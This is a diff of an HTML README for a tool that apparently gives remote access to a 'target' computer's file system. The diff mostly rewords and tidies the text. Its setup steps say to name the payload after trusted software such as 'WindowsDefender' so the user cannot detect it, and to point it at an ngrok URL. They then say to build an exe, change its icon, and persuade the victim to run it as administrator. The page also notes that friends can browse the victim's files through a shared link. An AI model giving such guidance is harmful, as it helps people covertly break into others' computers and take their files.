@@ -19,8 +19,8 @@
                 <ul>
                     <li>Create Folder & File</li>
                     <li>Delete Folder & File</li>
-                    <li>Rename File & Folder</li>
-                    <li>Download File % Folder</li>
+                    <li>Rename Folder & File</li>
+                    <li>Download Folder & File</li>
                 </ul>
             </p>
         </div>
@@ -29,7 +29,7 @@
             <h2>Requirements</h1>
             <hr class="px1">
             <ul>
-                <li>Software : Python (12 or greater)</li>
+                <li>Software : <a href="https://www.python.org/downloads/" target="_blank">Python (12 or greater)</a></li>
                 <li>Operating System : Windows 10 or greater</li>
                 <li>Servies :</li>
                 <ul>
@@ -86,15 +86,20 @@
             
 
             <h2>2. target</h2>
-            <p>This folder contains file that you can share in target's computer to get access of its file system but don't directly send files of this folder, actually this folder contains code only you need to replace some parts of the code so that target can connect directly to your hosting service then to you web server.</p>
-            <p>NOTE : This folder contains many files please don't rename, modify or move any file just follow the instruction given below.</p>
+            <p>This folder contains files you can use to gain access to a target computer's file system. However, do not directly share the files in this folder. Instead, make a few adjustments as outlined below to ensure the target can connect securely to your hosting service and then to your web server.</p>
+            <span>Note</span>
+            <ul>
+                <li>This folder includes multiple files. To maintain functionality, do not rename, modify, or move any files outside of what’s specified in the instructions below.</li>
+                <li>Follow the instructions carefully to replace specific parts of the code, enabling a direct connection between the target and your hosting service.</li>
+            </ul>
             <h3>SETUP</h3>
-            <p>step 1 : Make sure you have installed python on your system by opening CMD and using command <i>python --version</i>, if it shows any error so please properly download python from <a href="https://www.python.org/downloads/" target="_blank">python.org</a></p>
+            <p>step 1 : Ensure Python is installed on your system by opening CMD and entering the command
+                <i>python --version</i> If you encounter an error, please download and install Python from <a href="https://www.python.org/downloads/" target="_blank">python.org</a></p>
             <p>step 2 : Open targets folder and open infection_urls.py with any text editor you like.</p>
-            <p>step 3 : replace TARGET_NAME with a name that you think user can't detect like 'WindowsDefender', 'WindowsApplicationModel', 'MicrosoftServices' etc...</p>
-            <p>step 4 : replace NGROK_LINKER_URL with the URL of your hosting service that you have copied in previous section of 'ngrok linker'</p>
+            <p>step 3 : Replace TARGET_NAME with a name that you think user can't detect like 'WindowsDefender', 'WindowsApplicationModel', 'MicrosoftServices' etc...</p>
+            <p>step 4 : Replace NGROK_LINKER_URL with the URL of your hosting service that you have copied in previous section of 'ngrok linker'</p>
             <p>step 5 : Save the file.</p>
-            <p>step 6 (OPTIONAL) : if you like to change icon of file that you will send to target, so replace the icon file of your choice with the target_icon.ico file just make sure the file you are replacing have same name <i>i.e. 'target_icon.ico'</i> and file should be an ico file not png or other.</p>
+            <p>step 6 (OPTIONAL) : If you like to change icon of file that you will send to target, so replace the icon file of your choice with the target_icon.ico file just make sure the file you are replacing have same name <i>i.e. 'target_icon.ico'</i> and file should be an ico file not png or other.</p>
             <p>step 7 : Run generate shareable (1).bat by double clicking and follow the directions it gives after few times you will get an exe file share that with your target and say them to run (or you yourself run) it as administrator (on target's computer) just for once.</p>
             <p>NOTE : if shareable (1).bat not working so use shareable (2).bat</p>
 
@@ -112,7 +117,7 @@
             <p>step 6 : Save the file and go back into server folder</p>
             <p>step 7 : Double click and start main.exe or main file</p>
             <p>step 8 : Wait for few time (40-50sec) you will see IP address something like 'http:127.0.0.1:5000' put it in any browser to get GUI</p>
-            <p>NOTE : Ignore the ngrok url for now, Its used when any of your friend like to access the GUI interface without doing any installation in his computer so you can share this link to them, so that they can also access the GUI and access the target computer's file. Don't worry using it they can't access your computer's file untill you have not run that target file on your system. They simply use your computer's power to surf over target's file system if your system turned of or you closed the main program so they will can no longer access targets.</p>
+            <p>NOTE : Ignore ngrok URL for now, It allows your friends to access the GUI without needing to install anything on their computers. By sharing this link, they can explore the target computer's files, but they cannot access your computer's files unless the target file is actively running on your system. If your system is off or the main program is closed, they lose access to the target files.</p>
         </div>
     </div>
 </body>
